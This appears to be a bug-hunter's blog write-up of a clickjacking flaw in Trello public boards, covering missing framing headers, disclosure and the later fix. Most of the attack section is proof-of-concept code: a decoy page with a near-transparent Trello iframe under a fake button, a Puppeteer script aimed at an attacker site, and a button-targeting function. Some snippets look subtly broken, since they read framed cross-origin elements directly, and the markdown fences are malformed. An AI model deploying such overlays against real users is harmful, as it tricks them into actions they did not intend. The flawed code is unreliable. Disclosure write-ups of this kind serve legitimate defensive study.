---
title: "The Anatomy of a Clickjacking Vulnerability: A Trello Deep Dive"
description: "How a late-night discovery revealed a critical UI redress vulnerability in Trello's public boards, and what it teaches us about web security fundamentals."
summary: "An exploration of a clickjacking vulnerability found in Trello's public boards, examining the technical details, potential impacts, and broader security lessons about proper header configurations."
categories: ["Security", "Web Vulnerabilities"]
tags: ["Clickjacking", "Trello", "Web Security", "CSP"]
date: 2023-11-15
draft: false
---

It was 2:17 AM when I stumbled upon something unsettling. My desk was illuminated by the pale glow of a single monitor, surrounded by empty coffee mugs in various states of decay. I wasn't even hunting for bugs tonight - just trying to organize my open-source project's roadmap on Trello when something caught my eye in DevTools.

## The Midnight Discovery

![Developer console screenshot](console.jpg)

A simple curl command revealed the issue:

```bash
curl -I https://trello.com/b/public-board-123 | grep -iE 'frame|csp'
```

No output. No `X-Frame-Options`. No `frame-ancestors` in CSP. That was concerning.

I immediately tested embedding a Trello board:

```javascript
const iframe = document.createElement('iframe');
iframe.src = 'https://trello.com/b/public-board-123';
iframe.style = 'width:500px;height:300px;border:1px solid black';
document.body.appendChild(iframe);
```

It rendered perfectly. Too perfectly.

## Technical Deep Dive: Understanding the Vulnerability

### 1. Header Analysis
A proper security header configuration should include:

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

But Trello's public boards had neither. This meant:
- Any website could embed Trello boards in iframes
- No JavaScript frame-busting mechanisms were present
- All interactive elements remained clickable

### 2. Attack Surface Mapping
I cataloged all vulnerable UI elements:

| Element       | Selector          | Action                  |
|---------------|-------------------|-------------------------|
| Card          | .list-card        | Drag/drop, archive      |
| List          | .js-list          | Archive, move           |
| Board         | .board-header     | Rename, change permissions |

### 3. Interaction Testing
Using Puppeteer, I automated interaction tests:

```javascript
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  
  await page.goto('https://attacker-site.com/clickjacking-poc');
  
  // Verify iframe loads
  const iframe = await page.$('iframe');
  const src = await iframe.getProperty('src');
  console.log(`Embedding: ${src}`);
  
  // Test click interception
  await page.click('#fake-button');
  await page.waitForTimeout(2000);
  
  // Check if Trello action occurred
  const movedCard = await page.evaluate(() => {
    return document.querySelector('.list-card').style.transform !== '';
  });
  
  console.log(`Card moved: ${movedCard}`);
  await browser.close();
})();
```

## Building the Proof of Concept

### Version 1: Basic Overlay
```html
<!DOCTYPE html>
<html>
<head>
    <title>Productivity Dashboard</title>
    <style>
        #trello-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.05;
            z-index: 1;
        }
        #cta-button {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2;
            background: #4CAF50;
            color: white;
            padding: 15px 30px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            transition: all 0.3s ease;
        }
    </style>
</head>
<body>
    <h1 style="text-align:center;">Your Team Dashboard</h1>
    <div id="cta-button">Update Preferences</div>
    <iframe id="trello-iframe" src="https://trello.com/b/TARGET_BOARD"></iframe>
</body>
</html>
```

### Version 2: Advanced Targeting
Added dynamic positioning based on Trello's UI:

```javascript
// Calculate exact button positions
function getTrelloElementPositions() {
    return {
        archiveBtn: {
            x: document.querySelector('.js-archive').getBoundingClientRect().x,
            y: document.querySelector('.js-archive').getBoundingClientRect().y,
            width: document.querySelector('.js-archive').offsetWidth,
            height: document.querySelector('.js-archive').offsetHeight
        }
    };
}
```

## The Ethical Implications

The PoC worked flawlessly, presenting serious considerations:

**Minimal Impact Scenario:**
- Annoying but harmless board reorganizations

**Serious Abuse Potential:**
- Social engineering attacks ("Click to claim prize" while archiving critical cards)
- Corporate sabotage (disrupting public roadmaps)

I documented everything in a vulnerability report:

```markdown
# Vulnerability Report: Trello Clickjacking

## Technical Details
- **Missing Headers**: No X-Frame-Options or frame-ancestors CSP
- **Impact**: UI redress attacks on public boards
- **CVSS**: 6.5 (Medium)

## Recommended Fix
```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

## Resolution and Reflection

One week later, the fix was deployed. The headers now stood guard:

```http
HTTP/2 200
server: nginx
x-frame-options: DENY
content-security-policy: frame-ancestors 'none'
```

This experience taught me several crucial lessons:

1. **Public ≠ Secure**: Just because data is public doesn't mean the UI should be exposed
2. **Defense in Depth**: Multiple protection layers are crucial
3. **The Human Factor**: Even simple oversights can have significant security implications

The hunt continues. But sometimes, the most critical vulnerabilities reveal themselves when you're not even looking for them.

## References

[OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

[MDN Web Docs: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)

[Content Security Policy Level 2 Specification](https://www.w3.org/TR/CSP2/)
```

